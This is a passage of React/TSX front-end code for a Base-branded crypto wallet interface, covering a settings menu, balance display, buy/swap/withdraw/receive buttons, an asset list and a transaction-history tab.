                )}
            </AnimatePresence> */}

            {/* Conflict Modal - Overlay outside main container logic */}
            {/* <AnimatePresence>
                {showSessionConflictModal && (
                    <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
                        <motion.div
                            initial={{ opacity: 0 }}
                            animate={{ opacity: 1 }}
                            exit={{ opacity: 0 }}
                            className="absolute inset-0 bg-black/90 backdrop-blur-xl"
                        />
                        <motion.div
                            initial={{ scale: 0.9, opacity: 0, y: 20 }}
                            animate={{ scale: 1, opacity: 1, y: 0 }}
                            exit={{ scale: 0.9, opacity: 0, y: 20 }}
                            className={`relative w-full max-w-md border rounded-[2.5rem] p-8 text-center shadow-2xl space-y-6 ${theme === 'dark' ? 'bg-[#0a0b0d] text-white border-[#0052FF]/20' : 'bg-white text-[#0a0b0d] border-transparent'
                                }`}
                        >
                            <div className="w-20 h-20 bg-[#0052FF]/10 rounded-full flex items-center justify-center mx-auto border border-[#0052FF]/20">
                                <ShieldAlert className="w-10 h-10 text-[#0052FF]" />
                            </div>
                            <div className="space-y-2">
                                <h3 className={`text-2xl font-bold tracking-tight ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Active Session Found</h3>
                                <p className={`text-sm leading-relaxed px-2 ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>
                                    This wallet is already linked to another active session. To proceed here, you must disconnect the previous session and re-verify this wallet.
                                </p>
                            </div>

                            <div className={`rounded-2xl p-4 text-left space-y-2 border ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                <p className={`text-[10px] uppercase tracking-widest font-bold ${theme === 'dark' ? 'text-white/30' : 'text-gray-400'}`}>Verified Merchant</p>
                                <p className="text-xs font-mono text-blue-400 truncate">{conflictingSessionData?.fields?.merchant}</p>
                            </div>

                            <div className="flex flex-col gap-3 pt-2">
                                <button
                                    onClick={() => {
                                        setShowSessionConflictModal(false);
                                        // Once they confirm conflict, we clear the way for verification to re-run or proceed
                                        setIsAuthorized(true);
                                        setPageLoading(false);
                                    }}
                                    className="w-full py-4 bg-[#0052FF] hover:bg-[#004ada] !text-white rounded-xl font-bold transition-all shadow-lg active:scale-[0.98] flex items-center justify-center gap-2"
                                >
                                    Disconnect & Proceed
                                </button>
                                <button
                                    onClick={() => handleRedirect('disconnected')}
                                    className="w-full py-4 bg-white/5 text-gray-400 rounded-xl font-bold hover:bg-white/10 hover:text-white transition-all"
                                >
                                    Go Back
                                </button>
                            </div>
                        </motion.div>
                    </div>
                )}
            </AnimatePresence> */}

            {/* Main Application Logic - ONLY visible when authorized and no conflicts */}
            {/* {isAuthorized === true && !showSessionConflictModal && */}
            {true &&
             (
                <AnimatePresence>
                    {/* {!pageLoading && ( */}
                    {true && (
                        <motion.div
                            key="main-container"
                            className="w-full flex flex-col items-center"
                        >
                            {/* Main Wallet UI - Shows preview when disconnected or guest */}
                            <motion.div
                                key="app-state"
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                className={`min-h-screen pb-8 relative flex flex-col items-center w-full ${theme === 'dark' ? 'bg-[#0a0b0d]' : 'bg-white'}`}
                            >
                                {/* Solid Blue Header Background - Restricted width on desktop */}
                                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-[600px] h-[480px] bg-[#0052FF] rounded-b-[4rem] z-0 shadow-2xl shadow-blue-900/20"></div>

                                {/* Content Container (z-10 to sit above blue bg) */}
                                <div className="relative z-10 w-full max-w-[600px]">
                                    {/* Header */}
                                    <div className="px-6 pt-8 pb-2 flex items-center justify-between">
                                        {/* Network Pill */}
                                        <a
                                            href="https://base.org"
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            className="flex items-center gap-2 bg-blue-800/30 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/10 hover:bg-blue-800/40 transition-all cursor-pointer"
                                        >
                                            <div className="w-6 h-6 flex items-center justify-center bg-white rounded-full p-1 shadow-md shrink-0">
                                                <img
                                                    src="https://www.base.org/document/favicon-32x32.png"
                                                    alt="Base"
                                                    className="w-full h-full object-contain"
                                                />
                                            </div>
                                            <span className="text-xs font-semibold text-white/90">Base</span>
                                        </a>

                                        {/* Settings Icon + Dropdown */}
                                        <div className="relative">
                                            <motion.button
                                                whileTap={{ scale: 0.9 }}
                                                onClick={() => setShowSettingsMenu(v => !v)}
                                                className="w-9 h-9 flex items-center justify-center rounded-full bg-blue-800/30 backdrop-blur-md border border-white/10 text-white/80 hover:text-white hover:bg-blue-800/50 transition-all"
                                            >
                                                <Settings className="w-4 h-4" />
                                            </motion.button>

                                            <AnimatePresence>
                                                {showSettingsMenu && (
                                                    <>
                                                        {/* Backdrop */}
                                                        <div
                                                            key="backdrop-overlay"
                                                            className="fixed inset-0 z-[40]"
                                                            onClick={() => setShowSettingsMenu(false)}
                                                        />
                                                        {/* Dropdown */}
                                                        <motion.div
                                                            key="settings-dropdown"
                                                            initial={{ opacity: 0, scale: 0.95, y: -8 }}
                                                            animate={{ opacity: 1, scale: 1, y: 0 }}
                                                            exit={{ opacity: 0, scale: 0.95, y: -8 }}
                                                            transition={{ duration: 0.15, ease: 'easeOut' }}
                                                            className={`absolute top-11 right-0 z-[50] w-56 border rounded-2xl shadow-2xl overflow-hidden ${theme === 'dark' ? 'bg-[#13141a] border-white/10 shadow-black/60' : 'bg-white border-gray-200 shadow-gray-200/50'
                                                                }`}
                                                        >
                                                            {/* Header */}
                                                            <div className={`px-4 py-3 border-b ${theme === 'dark' ? 'border-white/5' : 'border-gray-100'}`}>
                                                                <p className={`text-[10px] font-bold uppercase tracking-widest ${theme === 'dark' ? 'text-white/30' : 'text-gray-400'}`}>Wallet</p>
                                                                {address && (
                                                                    <p className={`text-xs font-mono mt-0.5 truncate ${theme === 'dark' ? 'text-white/60' : 'text-gray-500'}`}>{address}</p>
                                                                )}
                                                            </div>

                                                            <div className="py-1">
                                                                {/* Connect / Disconnect */}
                                                                <button
                                                                    onClick={async () => {
                                                                        setShowSettingsMenu(false);
                                                                        if (loading) return;
                                                                        if (address) {
                                                                            disconnectWallet({
                                                                                callback: () => {
                                                                                    setBnbBalance('0');
                                                                                    setT22Balance(0);
                                                                                    setEthBalance('0');
                                                                                    setBtcBalance('0');
                                                                                    setUsdtBalance('0');
                                                                                }
                                                                            });
                                                                        } else {
                                                                            await connectWallet();
                                                                        }
                                                                    }}
                                                                    className={`w-full flex items-center gap-3 px-4 py-3 transition-colors group ${theme === 'dark' ? 'hover:bg-white/5' : 'hover:bg-gray-50'
                                                                        }`}
                                                                >
                                                                    <div className={`w-8 h-8 rounded-xl flex items-center justify-center ${address ? 'bg-red-500/15' : 'bg-blue-500/15'}`}>
                                                                        {loading ? (
                                                                            <motion.div animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity }} className={`w-4 h-4 border-2 border-t-white rounded-full ${theme === 'dark' ? 'border-white/30' : 'border-gray-200'}`} />
                                                                        ) : address ? (
                                                                            <LogOut className="w-4 h-4 text-red-400" />
                                                                        ) : (
                                                                            <Wallet className="w-4 h-4 text-blue-400" />
                                                                        )}
                                                                    </div>
                                                                    <div className="flex-1 text-left">
                                                                        <p className={`text-sm font-semibold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                                                                            {loading ? 'Connecting…' : address ? 'Disconnect' : 'Connect Wallet'}
                                                                        </p>
                                                                        <p className={`text-[10px] ${theme === 'dark' ? 'text-white/40' : 'text-gray-500'}`}>
                                                                            {address ? 'Sign out of your wallet' : 'Link your crypto wallet'}
                                                                        </p>
                                                                    </div>
                                                                    <ChevronRight className={`w-3.5 h-3.5 transition-colors ${theme === 'dark' ? 'text-white/20 group-hover:text-white/50' : 'text-gray-300 group-hover:text-gray-600'}`} />
                                                                </button>

                                                                {/* Copy Address */}
                                                                {address && (
                                                                    <button
                                                                        onClick={() => { copyAddress(); setShowSettingsMenu(false); }}
                                                                        className={`w-full flex items-center gap-3 px-4 py-3 transition-colors group ${theme === 'dark' ? 'hover:bg-white/5' : 'hover:bg-gray-50'
                                                                            }`}
                                                                    >
                                                                        <div className={`w-8 h-8 rounded-xl flex items-center justify-center ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-100'}`}>
                                                                            {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className={`w-4 h-4 ${theme === 'dark' ? 'text-white/50' : 'text-gray-400'}`} />}
                                                                        </div>
                                                                        <div className="flex-1 text-left">
                                                                            <p className={`text-sm font-semibold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{copied ? 'Copied!' : 'Copy Address'}</p>
                                                                            <p className={`text-[10px] ${theme === 'dark' ? 'text-white/40' : 'text-gray-500'}`}>Copy wallet address</p>
                                                                        </div>
                                                                    </button>
                                                                )}

                                                                <div className="mx-4 my-1 border-t border-white/5" />

                                                                {/* Mask Account Toggle */}
                                                                <button
                                                                    onClick={() => {
                                                                        const next = !maskAccount;
                                                                        setMaskAccount(next);
                                                                        localStorage.setItem('maskAccount', String(next));
                                                                    }}
                                                                    className={`w-full flex items-center gap-3 px-4 py-3 transition-colors group ${theme === 'dark' ? 'hover:bg-white/5' : 'hover:bg-gray-50'
                                                                        }`}
                                                                >
                                                                    <div className={`w-8 h-8 rounded-xl flex items-center justify-center ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-100'}`}>
                                                                        <svg className={`w-4 h-4 ${theme === 'dark' ? 'text-white/50' : 'text-gray-400'}`} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                                                                            {maskAccount
                                                                                ? <><path strokeLinecap="round" strokeLinejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268-2.943-9.543-7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" /></>
                                                                                : <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                                                            }
                                                                        </svg>
                                                                    </div>
                                                                    <div className="flex-1 text-left">
                                                                        <p className={`text-sm font-semibold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Mask Account</p>
                                                                        <p className={`text-[10px] ${theme === 'dark' ? 'text-white/40' : 'text-gray-500'}`}>{maskAccount ? 'Balances hidden' : 'Balances visible'}</p>
                                                                    </div>
                                                                    {/* Toggle pill */}
                                                                    <div className={`w-10 h-5.5 rounded-full relative transition-colors duration-300 ${maskAccount ? 'bg-blue-500' : 'bg-gray-200'}`} style={{ height: '22px', width: '40px' }}>
                                                                        <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-transform duration-300 ${maskAccount ? 'translate-x-5' : 'translate-x-0.5'}`} />
                                                                    </div>
                                                                </button>

                                                                {/* Theme Toggle */}
                                                                <button
                                                                    onClick={() => setTheme(t => t === 'dark' ? 'light' : 'dark')}
                                                                    className={`w-full flex items-center gap-3 px-4 py-3 transition-colors group ${theme === 'dark' ? 'hover:bg-white/5' : 'hover:bg-gray-50'
                                                                        }`}
                                                                >
                                                                    <div className={`w-8 h-8 rounded-xl flex items-center justify-center ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-100'}`}>
                                                                        {theme === 'dark' ? (
                                                                            <svg className="w-4 h-4 text-yellow-300" fill="currentColor" viewBox="0 0 24 24">
                                                                                <path d="M12 2.25a.75.75 0 01.75.75v2.25a.75.75 0 01-1.5 0V3a.75.75 0 01.75-.75zM7.5 12a4.5 4.5 0 119 0 4.5 4.5 0 01-9 0zM18.894 6.166a.75.75 0 00-1.06-1.06l-1.591 1.59a.75.75 0 101.06 1.061l1.591-1.59zM21.75 12a.75.75 0 01-.75.75h-2.25a.75.75 0 010-1.5H21a.75.75 0 01.75.75zM17.834 18.894a.75.75 0 001.06-1.06l-1.59-1.591a.75.75 0 10-1.061 1.06l1.59 1.591zM12 18a.75.75 0 01.75.75V21a.75.75 0 01-1.5 0v-2.25A.75.75 0 0112 18zM7.166 17.834a.75.75 0 00-1.06 1.06l1.59 1.591a.75.75 0 101.061-1.06l-1.591-1.591zM6 12a.75.75 0 01-.75.75H3a.75.75 0 010-1.5h2.25A.75.75 0 016 12zM6.166 6.166a.75.75 0 00-1.06 1.06l1.59 1.591a.75.75 0 101.061-1.06L6.166 6.166z" />
                                                                            </svg>
                                                                        ) : (
                                                                            <svg className="w-4 h-4 text-blue-300" fill="currentColor" viewBox="0 0 24 24">
                                                                                <path fillRule="evenodd" d="M9.528 1.718a.75.75 0 01.162.819A8.97 8.97 0 009 6a9 9 0 009 9 8.97 8.97 0 003.463-.69.75.75 0 01.981.98 10.503 10.503 0 01-9.694 6.46c-5.799 0-10.5-4.701-10.5-10.5 0-4.368 2.667-8.112 6.46-9.694a.75.75 0 01.818.162z" clipRule="evenodd" />
                                                                            </svg>
                                                                        )}
                                                                    </div>
                                                                    <div className="flex-1 text-left">
                                                                        <p className={`text-sm font-semibold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{theme === 'dark' ? 'Light Mode' : 'Dark Mode'}</p>
                                                                        <p className={`text-[10px] ${theme === 'dark' ? 'text-white/40' : 'text-gray-500'}`}>{theme === 'dark' ? 'Switch to light' : 'Switch to dark'}</p>
                                                                    </div>
                                                                    {/* Toggle pill */}
                                                                    <div className={`relative rounded-full transition-colors duration-300 ${theme === 'light' ? 'bg-blue-500' : 'bg-gray-200'}`} style={{ height: '22px', width: '40px' }}>
                                                                        <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-transform duration-300 ${theme === 'light' ? 'translate-x-5' : 'translate-x-0.5'}`} />
                                                                    </div>
                                                                </button>

                                                                {/* Default Currency */}
                                                                <button
                                                                    onClick={() => {
                                                                        setShowCurrencyPicker(v => !v);
                                                                    }}
                                                                    className="w-full flex items-center gap-3 px-4 py-3 hover:bg-white/5 transition-colors group"
                                                                >
                                                                    <div className="w-8 h-8 rounded-xl bg-white/5 flex items-center justify-center">
                                                                        <span className="text-sm font-bold text-white/50">$</span>
                                                                    </div>
                                                                    <div className="flex-1 text-left">
                                                                        <p className="text-sm font-semibold text-white">Default Currency</p>
                                                                        <p className="text-[10px] text-white/40">{defaultCurrency}</p>
                                                                    </div>
                                                                    <ChevronRight className={`w-3.5 h-3.5 text-white/20 transition-transform duration-200 ${showCurrencyPicker ? 'rotate-90' : ''}`} />
                                                                </button>

                                                                {/* Currency chips */}
                                                                <AnimatePresence>
                                                                    {showCurrencyPicker && (
                                                                        <motion.div
                                                                            initial={{ opacity: 0, height: 0 }}
                                                                            animate={{ opacity: 1, height: 'auto' }}
                                                                            exit={{ opacity: 0, height: 0 }}
                                                                            className="overflow-hidden"
                                                                        >
                                                                            <div className="px-4 pb-3 grid grid-cols-3 gap-1.5">
                                                                                {[
                                                                                    { code: 'USD', symbol: '$', name: 'US Dollar' },
                                                                                    { code: 'EUR', symbol: '€', name: 'Euro' },
                                                                                    { code: 'GBP', symbol: '£', name: 'British Pound' },
                                                                                    { code: 'JPY', symbol: '¥', name: 'Japanese Yen' },
                                                                                    { code: 'CAD', symbol: 'C$', name: 'Canadian Dollar' },
                                                                                    { code: 'AUD', symbol: 'A$', name: 'Australian Dollar' },
                                                                                    { code: 'CHF', symbol: 'Fr', name: 'Swiss Franc' },
                                                                                    { code: 'CNY', symbol: '¥', name: 'Chinese Yuan' },
                                                                                ].map(c => (
                                                                                    <button
                                                                                        key={c.code}
                                                                                        onClick={() => {
                                                                                            setDefaultCurrency(c.code);
                                                                                            localStorage.setItem('defaultCurrency', c.code);
                                                                                            setShowCurrencyPicker(false);
                                                                                        }}
                                                                                        className={`py-2 px-1 rounded-xl text-center transition-all ${defaultCurrency === c.code
                                                                                            ? 'bg-blue-500/20 border border-blue-500/50 text-blue-300'
                                                                                            : 'bg-white/5 border border-transparent text-white/50 hover:bg-white/10'
                                                                                            }`}
                                                                                    >
                                                                                        <p className="text-xs font-bold">{c.symbol}</p>
                                                                                        <p className="text-[9px] text-white/40 mt-0.5">{c.code}</p>
                                                                                    </button>
                                                                                ))}
                                                                            </div>
                                                                        </motion.div>
                                                                    )}
                                                                </AnimatePresence>

                                                                <div className="mx-4 my-1 border-t border-white/5" />

                                                                {/* Visit Base */}
                                                                <a
                                                                    href="https://base.org"
                                                                    target="_blank"
                                                                    rel="noopener noreferrer"
                                                                    onClick={() => setShowSettingsMenu(false)}
                                                                    className={`w-full flex items-center gap-3 px-4 py-3 transition-colors group ${theme === 'dark' ? 'hover:bg-white/5' : 'hover:bg-gray-50'
                                                                        }`}
                                                                >
                                                                    <div className={`w-8 h-8 rounded-xl flex items-center justify-center ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-100'}`}>
                                                                        <Globe className={`w-4 h-4 ${theme === 'dark' ? 'text-white/50' : 'text-gray-400'}`} />
                                                                    </div>
                                                                    <div className="flex-1 text-left">
                                                                        <p className={`text-sm font-semibold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Visit Base</p>
                                                                        <p className={`text-[10px] ${theme === 'dark' ? 'text-white/40' : 'text-gray-500'}`}>base.org</p>
                                                                    </div>
                                                                    <ChevronRight className={`w-3.5 h-3.5 transition-colors ${theme === 'dark' ? 'text-white/20 group-hover:text-white/50' : 'text-gray-300 group-hover:text-gray-600'}`} />
                                                                </a>

                                                                {/* Security */}
                                                                <a
                                                                    href="https://base.org/security"
                                                                    target="_blank"
                                                                    rel="noopener noreferrer"
                                                                    onClick={() => setShowSettingsMenu(false)}
                                                                    className={`w-full flex items-center gap-3 px-4 py-3 transition-colors group ${theme === 'dark' ? 'hover:bg-white/5' : 'hover:bg-gray-50'
                                                                        }`}
                                                                >
                                                                    <div className={`w-8 h-8 rounded-xl flex items-center justify-center ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-100'}`}>
                                                                        <Shield className={`w-4 h-4 ${theme === 'dark' ? 'text-white/50' : 'text-gray-400'}`} />
                                                                    </div>
                                                                    <div className="flex-1 text-left">
                                                                        <p className={`text-sm font-semibold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Security & Privacy</p>
                                                                        <p className={`text-[10px] ${theme === 'dark' ? 'text-white/40' : 'text-gray-500'}`}>Manage permissions</p>
                                                                    </div>
                                                                    <ChevronRight className={`w-3.5 h-3.5 transition-colors ${theme === 'dark' ? 'text-white/20 group-hover:text-white/50' : 'text-gray-300 group-hover:text-gray-600'}`} />
                                                                </a>
                                                            </div>
                                                        </motion.div>
                                                    </>
                                                )}
                                            </AnimatePresence>
                                        </div>
                                    </div>

                                    {/* Balance Section - Centered */}
                                    <div className="text-center mt-2 mb-8 px-4">
                                        <p className="text-blue-200/80 text-xs font-bold tracking-widest uppercase mb-3">
                                            {address ? 'Total Balance' : 'Portfolio Value'}
                                        </p>

                                        <div className="flex items-center justify-center gap-2 mb-4">
                                            <AnimatePresence mode="wait">
                                                <motion.h1
                                                    key={address ? totalBalance : 'preview'}
                                                    initial={{ opacity: 0, y: 10, scale: 0.95 }}
                                                    animate={{ opacity: 1, y: 0, scale: 1 }}
                                                    exit={{ opacity: 0, y: -10, scale: 0.95 }}
                                                    transition={{ duration: 0.2 }}
                                                    className="text-5xl font-medium text-white tracking-tight drop-shadow-lg select-none"
                                                >
                                                    {address
                                                        ? maskAccount
                                                            ? '••••••'
                                                            : formatFiat(totalBalance)
                                                        : `${currencySymbol}0.00`
                                                    }
                                                </motion.h1>
                                            </AnimatePresence>
                                        </div>

                                        {/* Address Pill / Login Trigger */}
                                        <button
                                            onClick={address ? copyAddress : connectWallet}
                                            className="inline-flex items-center gap-2 bg-blue-700/30 hover:bg-blue-700/50 transition-colors px-4 py-1.5 rounded-full border border-white/10"
                                        >
                                            <span className="text-xs text-blue-100 font-mono tracking-wide">
                                                {address
                                                    ? maskAccount ? '••••••••••••' : formatAddress(address)
                                                    : 'Connect Wallet'
                                                }
                                            </span>
                                            {address ? (
                                                copied ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3 text-blue-200" />
                                            ) : (
                                                <div className="w-1.5 h-1.5 bg-blue-400 rounded-full animate-pulse" />
                                            )}
                                        </button>
                                    </div>

                                    {/* Action Buttons - White Circles */}
                                    <div className="px-6 mb-10">
                                        <div className="flex justify-between items-start gap-2">
                                            {[
                                                { label: 'Buy', icon: <Plus className="w-6 h-6" />, action: () => address ? setShowBuyModal(true) : setShowAccountPrompt(true) },
                                                { label: 'Swap', icon: <ArrowUpDown className="w-6 h-6" />, action: () => address ? setShowSwapModal(true) : setShowAccountPrompt(true) },
                                                { label: 'Withdraw', icon: <ArrowUp className="w-6 h-6" />, action: () => address ? setShowWithdrawModal(true) : setShowAccountPrompt(true) },
                                                { label: 'Receive', icon: <ArrowDown className="w-6 h-6" />, action: () => address ? setShowRecieveModal(true) : setShowAccountPrompt(true) },
                                            ].map((btn, i) => (
                                                <motion.button
                                                    key={i}
                                                    onClick={btn.action}
                                                    whileHover={{ scale: 1.05 }}
                                                    whileTap={{ scale: 0.95 }}
                                                    className="flex flex-col items-center gap-2 flex-1 group"
                                                >
                                                    <div className="theme-action-btn w-14 h-14 rounded-full bg-black/20 text-white flex items-center justify-center shadow-lg group-hover:bg-black/30 backdrop-blur-md border border-white/10 transition-all">
                                                        {btn.icon}
                                                    </div>
                                                    <span className="text-xs font-semibold text-white/90 group-hover:text-white tracking-wide">{btn.label}</span>
                                                </motion.button>
                                            ))}
                                        </div>
                                    </div>

                                    {/* Tabs & List Content - Stepped down from header */}
                                    <div className="w-full mt-10">
                                        <div className="px-6 mb-4 flex gap-8 border-b border-white/10">
                                            {[
                                                { id: 'crypto', label: 'Crypto' },
                                                { id: 'history', label: 'Transactions' }
                                            ].map((tab) => (
                                                <button
                                                    key={tab.id}
                                                    onClick={() => setActiveTab(tab.id as any)}
                                                    className={`pb-3 text-sm font-semibold transition-all relative ${activeTab === tab.id
                                                        ? 'text-white'
                                                        : 'text-white/50 hover:text-white/80'
                                                        }`}
                                                >
                                                    {tab.label}
                                                    {activeTab === tab.id && (
                                                        <motion.div
                                                            layoutId="activeTab"
                                                            className="absolute bottom-0 left-0 right-0 h-0.5 bg-white rounded-t-full"
                                                        />
                                                    )}
                                                </button>
                                            ))}
                                        </div>

                                        <div className="px-4 pb-36 min-h-[300px]">
                                            <AnimatePresence mode="wait">
                                                {activeTab === 'crypto' ? (
                                                    <motion.div
                                                        key="crypto"
                                                        initial={{ opacity: 0, y: 10 }}
                                                        animate={{ opacity: 1, y: 0 }}
                                                        exit={{ opacity: 0, y: -10 }}
                                                        transition={{ duration: 0.2 }}
                                                        className="space-y-3"
                                                    >
                                                        {assets.length > 0 ? (
                                                            assets.map((asset, idx) => (
                                                                <motion.div
                                                                    key={asset.id}
                                                                    initial={{ opacity: 0, y: 10 }}
                                                                    animate={{ opacity: 1, y: 0 }}
                                                                    transition={{ delay: idx * 0.05 }}
                                                                    onClick={() => handleAssetClick(asset.symbol)}
                                                                    className={`flex items-center justify-between p-4 rounded-2xl border transition-colors cursor-pointer group ${theme === 'dark' ? 'bg-[#151515] border-white/5 hover:border-white/10' : 'bg-gray-50 border-gray-100 hover:border-blue-500/20 shadow-sm'
                                                                        }`}
                                                                >
                                                                    <div className="flex items-center gap-4">
                                                                        <div className="relative">
                                                                            <div className={`w-10 h-10 rounded-full flex items-center justify-center p-1.5 shadow-inner ${asset.color}`}>
                                                                                {asset.icon ? (
                                                                                    <img src={asset.icon} alt={asset.symbol} className="w-full h-full object-contain rounded-full" />
                                                                                ) : (
                                                                                    <span className="text-white font-bold text-lg">{asset.symbol.charAt(0)}</span>
                                                                                )}
                                                                            </div>
                                                                            {/* Network Badge */}
                                                                            {asset.network && NETWORKS[asset.network as keyof typeof NETWORKS] && (
                                                                                <div className={`theme-asset-logo absolute -bottom-1 -right-1 w-[18px] h-[18px] rounded-full overflow-hidden p-[1px] z-10 border-2 transition-all ${theme === 'dark' ? 'bg-[#151515] border-[#151515]' : 'bg-white border-white'
                                                                                    }`}>
                                                                                    <img src={NETWORKS[asset.network as keyof typeof NETWORKS]} className="w-full h-full object-contain rounded-full" />
                                                                                </div>
                                                                            )}
                                                                        </div>
                                                                        <div>
                                                                            <p className={`font-bold text-base ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{asset.name}</p>
                                                                            <p className="text-gray-500 text-xs font-medium">{asset.network} Network</p>
                                                                        </div>
                                                                    </div>
                                                                    <div className="text-right">
                                                                        <p className={`font-bold text-base select-none ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                                                                            {address
                                                                                ? maskAccount
                                                                                    ? <span className={`tracking-widest ${theme === 'dark' ? 'text-white/40' : 'text-gray-400'}`}>••••</span>
                                                                                    : formatFiat(asset.usdValue)
                                                                                : `${currencySymbol}0.00`
                                                                            }
                                                                        </p>
                                                                        <div className="flex flex-col items-end">
                                                                            <p className={`text-xs font-medium select-none ${theme === 'dark' ? 'text-gray-500' : 'text-gray-400'}`}>
                                                                                {address
                                                                                    ? maskAccount
                                                                                        ? <span className={`tracking-widest ${theme === 'dark' ? 'text-white/20' : 'text-gray-300'}`}>••••</span>
                                                                                        : `${asset.balance.toFixed(asset.symbol === 'BNB' ? 4 : 2)} ${asset.symbol}`
                                                                                    : `0.00 ${asset.symbol}`
                                                                                }
                                                                            </p>
                                                                            <div className="flex items-center gap-1.5 mt-0.5">
                                                                                <p className={`text-[10px] font-bold ${theme === 'dark' ? 'text-white/50' : 'text-gray-400'}`}>
                                                                                    {formatFiat(asset.marketPrice)}
                                                                                </p>
                                                                                <p className={`text-[10px] font-black ${asset.priceChange >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                                                                                    {asset.priceChange >= 0 ? '+' : ''}{asset.priceChange.toFixed(2)}%
                                                                                </p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </motion.div>
                                                            ))
                                                        ) : (
                                                            <div className="flex flex-col items-center justify-center pt-32 pb-20 text-center space-y-6">
                                                                <div className="relative">
                                                                    <div className="absolute inset-0 bg-[#0052FF]/10 blur-3xl rounded-full scale-150" />
                                                                    <Wallet className="w-16 h-16 text-[#0052FF] relative z-10" />
                                                                </div>
                                                                <div className="space-y-2">
                                                                    <h3 className={`text-xl font-bold tracking-tight ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'
                                                                        }`}>
                                                                        {address ? 'No Assets' : 'Wallet Not Connected'}
                                                                    </h3>
                                                                    <p className={`text-sm max-w-[280px] mx-auto leading-relaxed ${theme === 'dark' ? 'text-white/50' : 'text-gray-500'
                                                                        }`}>
                                                                        {address
                                                                            ? 'Your wallet is connected, but we couldn\'t find any supported assets. Try adding some to get started.'
                                                                            : 'Connect your wallet to view your assets, manage your portfolio, and swap tokens.'
                                                                        }
                                                                    </p>
                                                                </div>
                                                                {!address && (
                                                                    <button
                                                                        onClick={() => connectWallet()}
                                                                        className="px-4 py-2 bg-[#0052FF] !text-white rounded-lg font-bold text-xs hover:bg-[#004ada] transition-all shadow-md active:scale-[0.98] flex items-center gap-2"
                                                                    >
                                                                        <Plus className="w-3.5 h-3.5 font-black" /> Connect Wallet
                                                                    </button>
                                                                )}
                                                            </div>
                                                        )}
                                                    </motion.div>
                                                ) : (
                                                    <motion.div
                                                        key="history"
                                                        initial={{ opacity: 0, y: 10 }}
                                                        animate={{ opacity: 1, y: 0 }}
                                                        exit={{ opacity: 0, y: -10 }}
                                                        transition={{ duration: 0.2 }}
                                                        className="mt-8"
                                                    >
                                                        <TransactionHistory
                                                            transactions={transactions}
                                                            marketPrices={marketPrices}
                                                            currencySymbol={currencySymbol}
                                                            fxRate={fxRate}
                                                            maskAccount={maskAccount}
                                                            address={address}
                                                            onConnect={connectWallet}
                                                            theme={theme}
                                                        />
                                                    </motion.div>
                                                )}
                                            </AnimatePresence>
                                        </div>
                                    </div>
                                </div>
                            </motion.div>

                            {/* Return to FMA Capital — Mobile Footer */}
                            <div className={`fixed bottom-0 left-0 right-0 z-[50] backdrop-blur-2xl border-t pb-safe ${theme === 'dark' ? 'bg-[#0d0e11]/95 border-white/[0.06]' : 'bg-white/95 border-gray-100 shadow-[0_-8px_30px_rgb(0,0,0,0.04)]'
                                }`}>
                                <div className="px-4 pt-3 pb-4 flex flex-col items-center gap-2 max-w-[480px] mx-auto w-full">

                                    {/* Connection status badge */}
                                    <div className={`
                                    flex items-center gap-2 px-3 py-1 rounded-full mb-1 border
                                    ${address
                                            ? 'bg-green-500/10 border-green-500/20 text-green-600 dark:text-green-400'
                                            : 'bg-yellow-500/10 border-yellow-500/20 text-yellow-600 dark:text-yellow-500'}
                                `}>
                                        <div className={`w-1.5 h-1.5 rounded-full ${address ? 'bg-green-500' : 'bg-yellow-500'} animate-pulse shadow-[0_0_8px_currentColor]`} />
                                        <span className="text-[9px] font-black uppercase tracking-[0.12em]">
                                            {address ? 'Wallet Connected' : 'Wallet Not Connected'}
                                        </span>
                                    </div>

                                    {/* Main CTA button */}
                                    <button
                                        onClick={() => setShowReturnWarning(true)}
                                        className="relative w-auto px-8 py-2.5 bg-[#0052FF] rounded-xl font-bold text-xs !text-white overflow-hidden active:scale-[0.97] transition-all shadow-lg hover:bg-[#0041CC]"
                                    >
                                        <span className="relative flex items-center justify-center gap-2">
                                            <svg className="w-3.5 h-3.5 opacity-100" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                                                <path strokeLinecap="round" strokeLinejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                                            </svg>
